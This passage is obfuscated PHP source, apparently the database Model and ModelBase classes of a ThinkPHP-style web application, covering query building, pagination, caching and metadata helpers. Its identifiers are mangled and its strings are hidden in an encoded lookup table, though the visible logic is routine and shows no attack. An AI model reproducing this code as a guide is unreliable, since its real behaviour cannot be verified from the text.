$Š†Ü…ï && NOW_TIME <= $…ŒÒè™; case $Öâ¹úÜ[378]: return in_array(get_client_ip(), explode($Öâ¹úÜ[50], $¥¨Ìıù¬)); case $Öâ¹úÜ[379]: return !in_array(get_client_ip(), explode($Öâ¹úÜ[50], $¥¨Ìıù¬)); case $Öâ¹úÜ[366]: default: return $this->regex($”±£í™Š, $¥¨Ìıù¬); } } public function query($¤ŠŞŞ‹š, $İ“ùö˜º = false) { $£Ûë›‰ =& $_SERVER[¹òÍ›æş]; if (!is_bool($İ“ùö˜º) && !is_array($İ“ùö˜º)) { $İ“ùö˜º = func_get_args(); array_shift($İ“ùö˜º); } $¤ŠŞŞ‹š = str_replace(array($£Ûë›‰[59], $£Ûë›‰[380]), $£Ûë›‰[53], $¤ŠŞŞ‹š); $¤ŠŞŞ‹š = $this->parseSql($¤ŠŞŞ‹š, $İ“ùö˜º); return $this->db->query($¤ŠŞŞ‹š); } public function execute($‹ò°¨Ô, $äåª¢ª™ = false) { if (!is_bool($äåª¢ª™) && !is_array($äåª¢ª™)) { $äåª¢ª™ = func_get_args(); array_shift($äåª¢ª™); } $‹ò°¨Ô = $this->parseSql($‹ò°¨Ô, $äåª¢ª™); return $this->db->execute($‹ò°¨Ô); } protected function parseSql($¯öÁˆà¨, $‡ˆÇÌ³) { $¾ˆ±Ñùä =& $_SERVER[¹òÍ›æş]; if (!0 === $‡ˆÇÌ³) { $Í–’ùòı = $this->_parseOptions(); $¯öÁˆà¨ = $this->db->parseSql($¯öÁˆà¨, $Í–’ùòı); } elseif (is_array($‡ˆÇÌ³)) { $‡ˆÇÌ³ = array_map(array($this->db, $¾ˆ±Ñùä[381]), $‡ˆÇÌ³); $¯öÁˆà¨ = vsprintf($¯öÁˆà¨, $‡ˆÇÌ³); } else { $¯öÁˆà¨ = strtr($¯öÁˆà¨, array($¾ˆ±Ñùä[382] => $this->getTableName(), $¾ˆ±Ñùä[383] => think_config($¾ˆ±Ñùä[282]))); } $this->db->setModel($this->name); return $¯öÁˆà¨; } public function db($©£©è†Í = '', $¢üÑ•ˆ» = '', $–Ê»÷Ú˜ = array()) { $…¾ó¤¬Ô =& $_SERVER[¹òÍ›æş]; if ($…¾ó¤¬Ô[12] === $©£©è†Í && $this->db) { return $this->db; } static $‹ŠùçÆ’ = array(); static $íØËì¸ = array(); if (!isset($íØËì¸[$©£©è†Í]) || isset($íØËì¸[$©£©è†Í]) && $¢üÑ•ˆ» && $‹ŠùçÆ’[$©£©è†Í] != $¢üÑ•ˆ») { if (!empty($¢üÑ•ˆ») && is_string($¢üÑ•ˆ») && !1 === strpos($¢üÑ•ˆ», $…¾ó¤¬Ô[8])) { $¢üÑ•ˆ» = think_config($¢üÑ•ˆ»); } $©£©è†Í = think_guid($¢üÑ•ˆ»); $íØËì¸[$©£©è†Í] = Db::getInstance($¢üÑ•ˆ»); } elseif (NULL === $¢üÑ•ˆ») { $íØËì¸[$©£©è†Í]->close(); unset($íØËì¸[$©£©è†Í]); return; } if (!empty($–Ê»÷Ú˜)) { if (is_string($–Ê»÷Ú˜)) { parse_str($–Ê»÷Ú˜, $–Ê»÷Ú˜); } foreach ($–Ê»÷Ú˜ as $ğ²õ‹‰ñ => $á±†ë•‡) { $this->setProperty($ğ²õ‹‰ñ, $á±†ë•‡); } } $‹ŠùçÆ’[$©£©è†Í] = $¢üÑ•ˆ»; $this->db = $íØËì¸[$©£©è†Í]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Æş¾Õé = get_class($this); if ($Æş¾Õé == $_SERVER[¹òÍ›æş][384]) { return $this->name; } $this->name = substr($Æş¾Õé, 0, -5); } return $this->name; } public function getTableName() { $€³€ËÉ =& $_SERVER[¹òÍ›æş]; if (empty($this->trueTableName)) { $Òëø³´² = !empty($this->tablePrefix) ? $this->tablePrefix : $€³€ËÉ[12]; if (!empty($this->tableName)) { $Òëø³´² .= $this->tableName; } else { $Òëø³´² .= think_parse_name($this->name); } $this->trueTableName = strtolower($Òëø³´²); } return (!empty($this->dbName) ? $this->dbName . $€³€ËÉ[10] : $€³€ËÉ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $óß‚Œ±˜ =& $_SERVER[¹òÍ›æş]; return isset($this->fields[$óß‚Œ±˜[289]]) ? $this->fields[$óß‚Œ±˜[289]] : $this->pk; } public function getDbFields() { $®¸´çü =& $_SERVER[¹òÍ›æş]; if (isset($this->options[$®¸´çü[317]])) { $Ôª†èİş = $this->db->getFields($this->options[$®¸´çü[317]]); return $Ôª†èİş ? array_keys($Ôª†èİş) : !1; } if ($this->fields) { $Ôª†èİş = $this->fields; unset($Ôª†èİş[$®¸´çü[288]], $Ôª†èİş[$®¸´çü[289]], $Ôª†èİş[$®¸´çü[290]], $Ôª†èİş[$®¸´çü[287]]); return $Ôª†èİş; } return !1; } public function data($ìäŞõˆµ = '') { $î‚½ßğò =& $_SERVER[¹òÍ›æş]; if ($î‚½ßğò[12] === $ìäŞõˆµ && !empty($this->data)) { return $this->data; } if (is_object($ìäŞõˆµ)) { $ìäŞõˆµ = get_object_vars($ìäŞõˆµ); } elseif (is_string($ìäŞõˆµ)) { parse_str($ìäŞõˆµ, $ìäŞõˆµ); } elseif (!is_array($ìäŞõˆµ)) { think_exception(think_lang($î‚½ßğò[309])); } $this->data = $ìäŞõˆµ; return $this; } public function join($ÖğìÌñƒ) { $Ë†ıÆÈù =& $_SERVER[¹òÍ›æş]; if (is_array($ÖğìÌñƒ)) { $this->options[$Ë†ıÆÈù[320]] = $ÖğìÌñƒ; } elseif (!empty($ÖğìÌñƒ)) { $this->options[$Ë†ıÆÈù[320]][] = $ÖğìÌñƒ; } return $this; } public function union($ÈÜÇßÊ³, $Œ”‚Ï = false) { $äí™ŠŒ¾ =& $_SERVER[¹òÍ›æş]; if (empty($ÈÜÇßÊ³)) { return $this; } if ($Œ”‚Ï) { $this->options[$äí™ŠŒ¾[385]][$äí™ŠŒ¾[386]] = !0; } if (is_object($ÈÜÇßÊ³)) { $ÈÜÇßÊ³ = get_object_vars($ÈÜÇßÊ³); } if (is_string($ÈÜÇßÊ³)) { $’ÛÓûïä = $ÈÜÇßÊ³; } elseif (is_array($ÈÜÇßÊ³)) { if (isset($ÈÜÇßÊ³[0])) { $this->options[$äí™ŠŒ¾[385]] = array_merge($this->options[$äí™ŠŒ¾[385]], $ÈÜÇßÊ³); return $this; } else { $’ÛÓûïä = $ÈÜÇßÊ³; } } else { think_exception(think_lang($äí™ŠŒ¾[309])); } $this->options[$äí™ŠŒ¾[385]][] = $’ÛÓûïä; return $this; } public function cache($ş¨—ÅÒ¥ = true, $¿­Ìô›ì = null, $ç¡îûÓñ = '') { $øÓ’ËËõ =& $_SERVER[¹òÍ›æş]; if (!1 !== $ş¨—ÅÒ¥) { $this->options[$øÓ’ËËõ[387]] = array($øÓ’ËËõ[104] => $ş¨—ÅÒ¥, $øÓ’ËËõ[377] => $¿­Ìô›ì, $øÓ’ËËõ[33] => $ç¡îûÓñ); } return $this; } public function field($Äñ˜ÛÇ, $•®ü£ñ = false) { $Ã ¤Ù–¹ =& $_SERVER[¹òÍ›æş]; if (!0 === $Äñ˜ÛÇ) { $ùø¥“÷¡ = $this->getDbFields(); $Äñ˜ÛÇ = $ùø¥“÷¡ ? $ùø¥“÷¡ : $Ã ¤Ù–¹[199]; } elseif ($•®ü£ñ) { if (is_string($Äñ˜ÛÇ)) { $Äñ˜ÛÇ = explode($Ã ¤Ù–¹[50], $Äñ˜ÛÇ); } $ùø¥“÷¡ = $this->getDbFields(); $Äñ˜ÛÇ = $ùø¥“÷¡ ? array_diff($ùø¥“÷¡, $Äñ˜ÛÇ) : $Äñ˜ÛÇ; } $this->options[$Ã ¤Ù–¹[311]] = $Äñ˜ÛÇ; return $this; } public function scope($ ÃÒàŞ = '', $ÛÎã·­Æ = NULL) { $€‡Ÿà…ƒ =& $_SERVER[¹òÍ›æş]; if ($€‡Ÿà…ƒ[12] === $ ÃÒàŞ) { if (isset($this->_scope[$€‡Ÿà…ƒ[37]])) { $´ûÎ›èÜ = $this->_scope[$€‡Ÿà…ƒ[37]]; } else { return $this; } } elseif (is_string($ ÃÒàŞ)) { $âƒ–ş›õ = explode($€‡Ÿà…ƒ[50], $ ÃÒàŞ); $´ûÎ›èÜ = array(); foreach ($âƒ–ş›õ as $©¦¡“Íµ) { if (!isset($this->_scope[$©¦¡“Íµ])) { continue; } $´ûÎ›èÜ = array_merge($´ûÎ›èÜ, $this->_scope[$©¦¡“Íµ]); } if (!empty($ÛÎã·­Æ) && is_array($ÛÎã·­Æ)) { $´ûÎ›èÜ = array_merge($´ûÎ›èÜ, $ÛÎã·­Æ); } } elseif (is_array($ ÃÒàŞ)) { $´ûÎ›èÜ = $ ÃÒàŞ; } if (is_array($´ûÎ›èÜ) && !empty($´ûÎ›èÜ)) { $this->options = array_merge($this->options, array_change_key_case($´ûÎ›èÜ)); } return $this; } public function where($ÄÆîùí±, $»İá†ê = null) { $ÀÜ÷âÔè =& $_SERVER[¹òÍ›æş]; if (!is_null($»İá†ê) && is_string($ÄÆîùí±)) { if (!is_array($»İá†ê)) { $»İá†ê = func_get_args(); array_shift($»İá†ê); } $»İá†ê = array_map(array($this->db, $ÀÜ÷âÔè[381]), $»İá†ê); $ÄÆîùí± = vsprintf($ÄÆîùí±, $»İá†ê); } elseif (is_object($ÄÆîùí±)) { $ÄÆîùí± = get_object_vars($ÄÆîùí±); } elseif (is_array($ÄÆîùí±)) { foreach ($ÄÆîùí± as $’òâÍŞ => $İ˜ÜÄª¯) { if ((is_numeric($’òâÍŞ) || !$’òâÍŞ) && is_string($İ˜ÜÄª¯)) { if (strpos($İ˜ÜÄª¯, $ÀÜ÷âÔè[388]) === 0) { continue; } think_trace($ÀÜ÷âÔè[389], $ÀÜ÷âÔè[12], $ÀÜ÷âÔè[49]); die; } } } if (is_string($ÄÆîùí±) && $ÀÜ÷âÔè[12] != $ÄÆîùí±) { $ÂÍ†‘ğ = array(); $ÂÍ†‘ğ[$ÀÜ÷âÔè[390]] = $ÄÆîùí±; $ÄÆîùí± = $ÂÍ†‘ğ; } if (isset($this->options[$ÀÜ÷âÔè[313]])) { $this->options[$ÀÜ÷âÔè[313]] = array_merge($this->options[$ÀÜ÷âÔè[313]], $ÄÆîùí±); } else { $this->options[$ÀÜ÷âÔè[313]] = $ÄÆîùí±; } return $this; } public function limit($íõ³ŒŸ², $“Èı¶ = null) { $Ãâ¶Ôê =& $_SERVER[¹òÍ›æş]; $this->options[$Ãâ¶Ôê[330]] = is_null($“Èı¶) ? $íõ³ŒŸ² : $íõ³ŒŸ² . $Ãâ¶Ôê[50] . $“Èı¶; return $this; } public function page($ÆœÔÛàØ, $ôşô·É = null) { $ññŒÒ¥õ =& $_SERVER[¹òÍ›æş]; $this->options[$ññŒÒ¥õ[391]] = is_null($ôşô·É) ? $ÆœÔÛàØ : $ÆœÔÛàØ . $ññŒÒ¥õ[50] . $ôşô·É; return $this; } public function comment($¸¦µšÎ) { $this->options[$_SERVER[¹òÍ›æş][392]] = $¸¦µšÎ; return $this; } public function setProperty($ƒØÁàî, $“Ê·Ìáö) { if (property_exists($this, $ƒØÁàî)) { $this->{$ƒØÁàî} = $“Ê·Ìáö; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\124\151\155\145", "\164\151\x6d\145", "\151\x6e\x73\x65\162\x74\54\x75\160\144\141\164\145", "\x66\x75\x6e\x63\164\151\x6f\x6e"), array("\143\x72\x65\x61\164\x65\124\x69\155\x65", "\164\151\x6d\x65", "\x69\156\x73\145\162\164", "\x66\165\x6e\x63\x74\151\x6f\156")); public function setDataAuto($ íƒøŒ) { $this->dataAuto = $ íƒøŒ; } public function __construct($Û¨–õ = '', $¥ä İ³Ù = '', $ŸÙİóµ = '') { parent::__construct($Û¨–õ, $¥ä İ³Ù, $ŸÙİóµ); } protected $tableMeta = array(); protected function _beforeInsert(&$¾˜áåê€, $ŒşÑşˆ©) { $»¦’Îµ¤ =& $_SERVER[¹òÍ›æş]; if (!$this->checkDataAutoHas($»¦’Îµ¤[393])) { return; } $this->dataBeforeFilter($¾˜áåê€, $»¦’Îµ¤[393]); } protected function _beforeUpdate(&$ª™•ã³Ñ, $ŞÁşì£ê) { $èÖç±Ó =& $_SERVER[¹òÍ›æş]; if (!$this->checkDataAutoHas($èÖç±Ó[394])) { return; } $this->dataBeforeFilter($ª™•ã³Ñ, $èÖç±Ó[394]); } protected function _afterSelect(&$ †Ü‚ùƒ, $ÎÌ‘æÍ) { if (!is_array($ †Ü‚ùƒ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹òÍ›æş][395])) { return; } foreach ($ †Ü‚ùƒ as &$—í…çâæ) { $this->dataAfterFilter($—í…çâæ); } unset($—í…çâæ); } protected function _afterFind(&$¯•­­Ú, $Âµë—±ì) { if (!is_array($¯•­­Ú)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹òÍ›æş][395])) { return; } $this->dataAfterFilter($¯•­­Ú); } public static function textEncode($şåî»“£) { if (!$şåî»“£) { return $şåî»“£; } $½ÜÒ¹â = json_encode($şåî»“£); $½ÜÒ¹â = preg_replace_callback($_SERVER[¹òÍ›æş][396], function ($­¶ëëô­) { return addslashes($­¶ëëô­[0]); }, $½ÜÒ¹â); return json_decode($½ÜÒ¹â); } public static function textDecode($•¾í´ğ²) { $šÄ°ìÉ =& $_SERVER[¹òÍ›æş]; $Éš–¯·Ÿ = json_encode($•¾í´ğ²); $Éš–¯·Ÿ = preg_replace_callback($šÄ°ìÉ[397], function ($ØÃÊğêº) { return $_SERVER[¹òÍ›æş][107]; }, $Éš–¯·Ÿ); return json_decode($Éš–¯·Ÿ); } public function setAutoIncrement($Ø‘¡¹) { $Ä­ÍæÖØ = array($this->getPk() => $Ø‘¡¹); $ß‘Ö»Œ = $this->data($Ä­ÍæÖØ)->add(); if ($ß‘Ö»Œ) { $this->delete($ß‘Ö»Œ); } } public function getAutoIncrement() { $äÉĞñÊñ = $this->getTableName(); $ÎüÈ†ª¦ = $this->max($this->getPk()); $£÷Ûşîµ = $this->query("\x73\x68\157\167\x20\x74\x61\x62\154\145\x20\163\164\141\164\165\x73\x20\x77\x68\x65\162\145\40\x4e\x61\x6d\145\75\x27{$äÉĞñÊñ}\47"); $ş¨ùÁ‡ø = $£÷Ûşîµ[0][$_SERVER[¹òÍ›æş][398]]; $à™”™”º = max($ÎüÈ†ª¦, $ş¨ùÁ‡ø); return $à™”™”º; } protected function _callBefore($÷©áßÁ¨, $ß›î×é) { return $this->cacheCallCheck($÷©áßÁ¨, $ß›î×é, !1); } protected function _callAfter($Ó Ğõ²ı, $¢ß«¹ìÏ) { return $this->cacheCallCheck($Ó Ğõ²ı, $¢ß«¹ìÏ, !0); } protected function cacheFunctionAlias($½¯ƒÎü®) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($€äŠà¨®, $—˜˜ÃÖ¤, $œ¦¬Çñ’ = false) { $ˆµêêšş = $this->cacheFunctionAlias($—˜˜ÃÖ¤); if (!$ˆµêêšş) { return; } foreach ($ˆµêêšş as $õÎâ•‹ => $ÇØĞ¤”Ä) { $–Üáûñ = $ÇØĞ¤”Ä[0]; $¦ÕÑó—ö = explode($_SERVER[¹òÍ›æş][50], $ÇØĞ¤”Ä[1]); if ($€äŠà¨® == $õÎâ•‹) { return $this->cacheFunctionGet($õÎâ•‹, $–Üáûñ); } if ($œ¦¬Çñ’ && in_array($€äŠà¨®, $¦ÕÑó—ö)) { $this->cacheFunctionClear($õÎâ•‹, $–Üáûñ); } } } public function cacheFunctionGet($¦¼«ú¢, $ƒ¦ˆÌ›) { $Ÿ½§°‚ = $this->cacheKeyMake($¦¼«ú¢, $ƒ¦ˆÌ›); $€àì¦ş– = Cache::get($Ÿ½§°‚); if (!is_array($€àì¦ş–)) { $€àì¦ş– = call_user_func_array(array($this, $¦¼«ú¢), array($ƒ¦ˆÌ›, !0)); Cache::set($Ÿ½§°‚, $€àì¦ş–); } return $€àì¦ş–; } public function cacheFunctionClear($µ÷Ÿø†·, $¹ºÒÛë¦) { $ËµÚ†¸ = $¹ºÒÛë¦; if (!is_array($¹ºÒÛë¦)) { $ËµÚ†¸ = array($¹ºÒÛë¦); } foreach ($ËµÚ†¸ as $Àí“ş€•) { $ÒëÀ¾ô = $this->cacheKeyMake($µ÷Ÿø†·, $Àí“ş€•); Cache::remove($ÒëÀ¾ô); } } private function cacheKeyMake($¶à¥«¥, $Œèï™ôó) { $ùòÏÇòş =& $_SERVER[¹òÍ›æş]; return get_class($this) . $ùòÏÇòş[11] . $¶à¥«¥ . $ùòÏÇòş[399] . $Œèï™ôó; } protected function selectPageReset() { $ŠÜ÷®â¥ =& $_SERVER[¹òÍ›æş]; if (isset($GLOBALS[$ŠÜ÷®â¥[400]])) { return; } $GLOBALS[$ŠÜ÷®â¥[400]] = isset($GLOBALS[$ŠÜ÷®â¥[7]][$ŠÜ÷®â¥[401]]) ? $GLOBALS[$ŠÜ÷®â¥[7]][$ŠÜ÷®â¥[401]] : !1; $GLOBALS[$ŠÜ÷®â¥[402]] = isset($GLOBALS[$ŠÜ÷®â¥[7]][$ŠÜ÷®â¥[391]]) ? $GLOBALS[$ŠÜ÷®â¥[7]][$ŠÜ÷®â¥[391]] : !1; $GLOBALS[$ŠÜ÷®â¥[7]][$ŠÜ÷®â¥[401]] = !1; $GLOBALS[$ŠÜ÷®â¥[7]][$ŠÜ÷®â¥[391]] = !1; } protected function selectPageRestore() { $Çª†š¹â =& $_SERVER[¹òÍ›æş]; if (!isset($GLOBALS[$Çª†š¹â[400]])) { return; } $GLOBALS[$Çª†š¹â[7]][$Çª†š¹â[401]] = $GLOBALS[$Çª†š¹â[400]]; $GLOBALS[$Çª†š¹â[7]][$Çª†š¹â[391]] = $GLOBALS[$Çª†š¹â[402]]; if ($GLOBALS[$Çª†š¹â[7]][$Çª†š¹â[401]] === !1) { unset($GLOBALS[$Çª†š¹â[7]][$Çª†š¹â[401]]); } if ($GLOBALS[$Çª†š¹â[7]][$Çª†š¹â[391]] === !1) { unset($GLOBALS[$Çª†š¹â[7]][$Çª†š¹â[391]]); } unset($GLOBALS[$Çª†š¹â[400]]); unset($GLOBALS[$Çª†š¹â[402]]); } protected function selectPage($´çÍıÛñ = 200, $»Ÿø¿· = 1) { $Îü†æûÂ =& $_SERVER[¹òÍ›æş]; global $in; $œè¼­×÷ = $this->optionsValue(); $Ì‚ç¶¯Ç = 50000; $´çÍıÛñ = isset($in[$Îü†æûÂ[401]]) && $in[$Îü†æûÂ[401]] ? $in[$Îü†æûÂ[401]] : $´çÍıÛñ; if ($´çÍıÛñ === -1) { $in[$Îü†æûÂ[401]] = !1; $Ì‚ç¶¯Ç = 100000000; $´çÍıÛñ = $Ì‚ç¶¯Ç; } $¹õâÊ€ = $œè¼­×÷; $¹õâÊ€[$Îü†æûÂ[403]] = array(); $´çÍıÛñ = intval($´çÍıÛñ); $´çÍıÛñ = $´çÍıÛñ <= 5 ? 5 : ($´çÍıÛñ >= $Ì‚ç¶¯Ç ? $Ì‚ç¶¯Ç : $´çÍıÛñ); $»Ÿø¿· = intval(isset($in[$Îü†æûÂ[391]]) && $in[$Îü†æûÂ[391]] ? $in[$Îü†æûÂ[391]] : $»Ÿø¿·); $»Ÿø¿· = $»Ÿø¿· <= 1 ? 1 : $»Ÿø¿·; $¬· Ë†¶ = array(); $­áÖÕÁş = 1; if ($»Ÿø¿· == 1 && $­áÖÕÁş) { $this->optionsValue($œè¼­×÷); $¬· Ë†¶ = $this->page($»Ÿø¿·, $´çÍıÛñ)->select(); $Ú ‚”— = is_array($¬· Ë†¶) ? count($¬· Ë†¶) : 0; if ($Ú ‚”— < $´çÍıÛñ) { $°éÓÛãÇ = 1; } else { $this->optionsValue($¹õâÊ€); $Ú ‚”— = intval($this->count()); $°éÓÛãÇ = ceil($Ú ‚”— / $´çÍıÛñ); } } else { $this->optionsValue($¹õâÊ€); $Ú ‚”— = intval($this->count()); $°éÓÛãÇ = ceil($Ú ‚”— / $´çÍıÛñ); $»Ÿø¿· = $»Ÿø¿· >= $°éÓÛãÇ ? $°éÓÛãÇ : $»Ÿø¿·; $this->optionsValue($œè¼­×÷); $¬· Ë†¶ = $this->page($»Ÿø¿·, $´çÍıÛñ)->select(); } if (!is_array($¬· Ë†¶)) { $¬· Ë†¶ = array(); } if ($°éÓÛãÇ == 1) { $Ú ‚”— = count($¬· Ë†¶); } $ôŞ­…Åı = array($Îü†æûÂ[404] => array($Îü†æûÂ[405] => $Ú ‚”—, $Îü†æûÂ[401] => $´çÍıÛñ, $Îü†æûÂ[391] => $»Ÿø¿·, $Îü†æûÂ[406] => $°éÓÛãÇ), $Îü†æûÂ[407] => $¬· Ë†¶); return $ôŞ­…Åı; } protected function checkLength($ÄÀÃÒ¹…, $Ïº”ÒÅñ = 0, $¢‰‘ó´¹ = '') { $ŞüÚôşÂ =& $_SERVER[¹òÍ›æş]; $Ïº”ÒÅñ = $Ïº”ÒÅñ ? $Ïº”ÒÅñ : 65536; if (!$ÄÀÃÒ¹… || strlen($ÄÀÃÒ¹…) < $Ïº”ÒÅñ) { return; } $¢‰‘ó´¹ = $¢‰‘ó´¹ ? $¢‰‘ó´¹ . $ŞüÚôşÂ[81] : $ŞüÚôşÂ[12]; show_json($¢‰‘ó´¹ . LNG($ŞüÚôşÂ[408]) . "\50{$Ïº”ÒÅñ}\x29", !1); } protected function metaSet($´œàñû, $³£ŠóÑ« = null, $ÏğÌãÖ° = null) { $ÆÎî¸ =& $_SERVER[¹òÍ›æş]; if (!$this->tableMeta || !$´œàñû) { return !1; } $ÉÉÏ•çè = $this->tableMeta[$ÆÎî¸[409]]; $¼”—”¨Ã = $this->tableMeta[$ÆÎî¸[410]]; $ÖÑİéÁ‡ = Model($¼”—”¨Ã); $–Ø‚Ü’¹ = array($ÉÉÏ•çè => $´œàñû, $ÆÎî¸[411] => $³£ŠóÑ«); if (is_null($³£ŠóÑ«)) { return $ÖÑİéÁ‡->where(array($ÉÉÏ•çè => $´œàñû))->delete(); } if (is_null($ÏğÌãÖ°) && is_string($³£ŠóÑ«)) { return $ÖÑİéÁ‡->where($–Ø‚Ü’¹)->delete(); } $üòòœÁÍ = is_array($³£ŠóÑ«) ? $³£ŠóÑ« : array(); if (is_string($³£ŠóÑ«)) { $üòòœÁÍ[$³£ŠóÑ«] = $ÏğÌãÖ°; } $ÓîÓ³×• = array(); foreach ($üòòœÁÍ as $“éãâ˜‘ => $â”Ğ¼ï¬) { if (is_null($â”Ğ¼ï¬) && is_string($“éãâ˜‘)) { $ÖÑİéÁ‡->where(array($ÉÉÏ•çè => $´œàñû, $ÆÎî¸[411] => $“éãâ˜‘))->delete(); continue; } $this->checkLength($â”Ğ¼ï¬, !1, $¼”—”¨Ã . $ÆÎî¸[4] . $“éãâ˜‘); $ÓîÓ³×•[] = array($ÉÉÏ•çè => $´œàñû, $ÆÎî¸[104] => $“éãâ˜‘, $ÆÎî¸[412] => $â”Ğ¼ï¬); } $Æ¿‚Ïíú = $ÆÎî¸[413] . $¼”—”¨Ã; CacheLock::lock($Æ¿‚Ïíú); $ÖÑİéÁ‡->where(array($ÉÉÏ•çè => $´œàñû))->addAll($ÓîÓ³×•, array(), !0); CacheLock::unlock($Æ¿‚Ïíú); return !0; } public function metaGet($¥È”¾Â÷, $¢¸Ùäô– = false) { $®ê×÷‰ =& $_SERVER[¹òÍ›æş]; if (!$this->tableMeta) { return array(); } $‡•õ—Ğ = $this->tableMeta[$®ê×÷‰[409]]; $ÁÉ¥ñÎ = Model($this->tableMeta[$®ê×÷‰[410]]); if ($¢¸Ùäô–) { $‚×Ë‡ = array($‡•õ—Ğ => $¥È”¾Â÷, $®ê×÷‰[104] => $¢¸Ùäô–); return $ÁÉ¥ñÎ->where($‚×Ë‡)->getField($®ê×÷‰[412]); } $‚×Ë‡ = array($‡•õ—Ğ => $¥È”¾Â÷); $ÈøÄÉŞ = $ÁÉ¥ñÎ->field($®ê×÷‰[414])->where($‚×Ë‡)->select(); $ÈøÄÉŞ = array_to_keyvalue($ÈøÄÉŞ, $®ê×÷‰[104], $®ê×÷‰[412]); return $ÈøÄÉŞ; } private function checkDataAutoHas($÷ä¯˜Ò€) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $üÙüÜÎ˜) { if (in_array($÷ä¯˜Ò€, explode($_SERVER[¹òÍ›æş][50], $üÙüÜÎ˜[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$÷ÅŞş²ö, $ú²“Á¢) { $óîÎô¹ =& $_SERVER[¹òÍ›æş]; if (!is_array($÷ÅŞş²ö)) { return; } foreach ($this->dataAuto as $ÑØå›÷Ú) { $²Úƒª›ˆ = $ÑØå›÷Ú[0]; if (!in_array($ú²“Á¢, explode($óîÎô¹[50], $ÑØå›÷Ú[2]))) { continue; } switch (trim($ÑØå›÷Ú[3])) { case $óîÎô¹[359]: case $óîÎô¹[360]: $±ã’÷” = $ÑØå›÷Ú[1]; $»’«Á–ó = isset($ÑØå›÷Ú[4]) ? (array) $ÑØå›÷Ú[4] : array(); if ($±ã’÷” == $óîÎô¹[190] && array_key_exists($²Úƒª›ˆ, $÷ÅŞş²ö)) { if (!$÷ÅŞş²ö[$²Úƒª›ˆ]) { unset($÷ÅŞş²ö[$²Úƒª›ˆ]); } break; } if (isset($÷ÅŞş²ö[$²Úƒª›ˆ])) { array_unshift($»’«Á–ó, $÷ÅŞş²ö[$²Úƒª›ˆ]); } if ($óîÎô¹[359] == $ÑØå›÷Ú[3]) { $÷ÅŞş²ö[$²Úƒª›ˆ] = call_user_func_array($±ã’÷”, $»’«Á–ó); } else { $÷ÅŞş²ö[$²Úƒª›ˆ] = call_user_func_array(array(&$this, $±ã’÷”), $»’«Á–ó); } break; case $óîÎô¹[308]: if (isset($÷ÅŞş²ö[$²Úƒª›ˆ]) && $÷ÅŞş²ö[$²Úƒª›ˆ]) { $÷ÅŞş²ö[$²Úƒª›ˆ] = call_user_func_array(array(&$this, $ÑØå›÷Ú[1]), array($÷ÅŞş²ö[$²Úƒª›ˆ])); } break; case $óîÎô¹[311]: $÷ÅŞş²ö[$²Úƒª›ˆ] = $÷ÅŞş²ö[$ÑØå›÷Ú[1]]; break; case $óîÎô¹[332]: if (isset($÷ÅŞş²ö[$²Úƒª›ˆ]) && !is_string($÷ÅŞş²ö[$²Úƒª›ˆ])) { $÷ÅŞş²ö[$²Úƒª›ˆ] = json_encode_force($÷ÅŞş²ö[$²Úƒª›ˆ]); } break; case $óîÎô¹[361]: if ($÷ÅŞş²ö[$²Úƒª›ˆ] === $óîÎô¹[12]) { unset($÷ÅŞş²ö[$²Úƒª›ˆ]); } break; case $óîÎô¹[362]: $÷ÅŞş²ö[$²Úƒª›ˆ] = $ÑØå›÷Ú[1]; default: break; } } if ($ú²“Á¢ == $óîÎô¹[393]) { $ØÔéØ» = strtolower($this->db->getDbType()); if (strpos($ØÔéØ», $óîÎô¹[13]) !== 0) { return; } $Šõ…²èñ = $this->field(!0)->fields; $õè›Ÿî = $Šõ…²èñ[$óîÎô¹[290]]; if (isset($Šõ…²èñ[$óîÎô¹[289]])) { unset($õè›Ÿî[$Šõ…²èñ[$óîÎô¹[289]]]); } foreach ($õè›Ÿî as $ä¤–Â¾ï => $ú²“Á¢) { if (!isset($÷ÅŞş²ö[$ä¤–Â¾ï])) { $÷ÅŞş²ö[$ä¤–Â¾ï] = $óîÎô¹[12]; } } } } private function dataAfterFilter(&$Ş¨›éèİ) { $ñÆ¼Æøº =& $_SERVER[¹òÍ›æş]; foreach ($this->dataAuto as $èÒ¤õì¢) { $¢ŞıêÑ© = $èÒ¤õì¢[0]; if (!isset($Ş¨›éèİ[$¢ŞıêÑ©])) { continue; } if (!in_array($ñÆ¼Æøº[395], explode($ñÆ¼Æøº[50], $èÒ¤õì¢[2]))) { continue; } switch (trim($èÒ¤õì¢[3])) { case $ñÆ¼Æøº[359]: case $ñÆ¼Æøº[360]: $ôäÖøµ = isset($èÒ¤õì¢[4]) ? (array) $èÒ¤õì¢[4] : array(); array_unshift($ôäÖøµ, $Ş¨›éèİ[$¢ŞıêÑ©]); if (isset($èÒ¤õì¢[4]) && $èÒ¤õì¢[4] == $ñÆ¼Æøº[415]) { $ôäÖøµ = array($Ş¨›éèİ[$¢ŞıêÑ©]); } if ($ñÆ¼Æøº[359] == $èÒ¤õì¢[3]) { $Ş¨›éèİ[$¢ŞıêÑ©] = call_user_func_array($èÒ¤õì¢[1], $ôäÖøµ); } else { $Ş¨›éèİ[$¢ŞıêÑ©] = call_user_func_array(array(&$this, $èÒ¤õì¢[1]), $ôäÖøµ); } break; case $ñÆ¼Æøº[308]: if (isset($Ş¨›éèİ[$¢ŞıêÑ©]) && $Ş¨›éèİ[$¢ŞıêÑ©]) { $Ş¨›éèİ[$¢ŞıêÑ©] = call_user_func_array(array(&$this, $èÒ¤õì¢[1]), array($Ş¨›éèİ[$¢ŞıêÑ©])); } break; case $ñÆ¼Æøº[311]: $Ş¨›éèİ[$¢ŞıêÑ©] = $Ş¨›éèİ[$èÒ¤õì¢[1]]; break; case 